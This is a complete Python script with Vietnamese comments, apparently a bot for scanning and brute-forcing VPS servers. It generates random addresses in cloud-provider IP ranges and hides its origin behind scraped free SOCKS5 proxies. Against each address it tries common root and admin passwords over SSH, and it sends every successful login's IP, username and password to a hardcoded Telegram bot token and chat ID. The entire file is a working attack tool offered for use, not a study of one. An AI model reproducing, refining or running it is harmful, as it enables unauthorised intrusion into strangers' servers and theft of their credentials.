import paramiko
import socks
import socket
import requests
import random
import time
import threading

# --- CẤU HÌNH ---
TELE_TOKEN = "8770472029:AAF0Abw9Xc8U0ZPkkiF-Erb1aRNbzqoHDCY"
TELE_CHAT_ID = "6706357035"

# Danh sách dải IP mục tiêu (DigitalOcean, Vultr, v.v.)
IP_RANGES = ["128.199", "159.203", "167.71", "45.32", "139.59"]
USERS = ["root", "admin"]
PASSWORDS = ["123456", "root", "admin123", "password", "12345"]

def send_tele(message):
    url = f"https://api.telegram.org/bot{TELE_TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": TELE_CHAT_ID, "text": message}, timeout=10)
    except: pass

def get_free_proxies():
    """Tự động lấy danh sách Socks5 miễn phí"""
    print("[*] Đang tìm kiếm Proxy Socks5 sạch...")
    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all"
    try:
        res = requests.get(url, timeout=10)
        proxies = [p for p in res.text.strip().split('\r\n') if ":" in p]
        print(f"[+] Đã hốt được {len(proxies)} Proxy Socks5!")
        return proxies
    except:
        return []

def scan_vps(target_ip, proxy_list):
    if not proxy_list: return
    
    proxy = random.choice(proxy_list)
    p_ip, p_port = proxy.split(":")
    
    for user in USERS:
        for password in PASSWORDS:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            try:
                # Cấu hình Proxy Socks5 cho socket
                proxy_sock = socks.socksocket()
                proxy_sock.set_proxy(socks.SOCKS5, p_ip, int(p_port))
                proxy_sock.settimeout(4)
                proxy_sock.connect((target_ip, 22))
                
                # Thử kết nối SSH
                ssh.connect(target_ip, username=user, password=password, sock=proxy_sock, timeout=5)
                
                # NẾU THÀNH CÔNG
                result = f"🚀 VPS HÍT ĐƯỢC!\nIP: {target_ip}\nUser: {user}\nPass: {password}\nProxy: {proxy}"
                print(result)
                send_tele(result)
                ssh.close()
                return
            except Exception:
                continue

def main():
    send_tele("🎯 BOT SCAN VPS (AUTO PROXY) KHỞI CHẠY!")
    
    while True:
        # 1. Làm mới danh sách Proxy
        proxies = get_free_proxies()
        if not proxies:
            time.sleep(60)
            continue
            
        # 2. Quét ngẫu nhiên các IP
        for _ in range(50): # Quét 50 IP mỗi đợt lấy proxy
            base = random.choice(IP_RANGES)
            target_ip = f"{base}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            
            # Chạy luồng (Thread) để quét nhanh hơn
            t = threading.Thread(target=scan_vps, args=(target_ip, proxies))
            t.start()
            time.sleep(0.5) # Tránh treo máy Railway

        time.sleep(30) # Nghỉ một lát rồi lấy list proxy mới

if __name__ == "__main__":
    main()
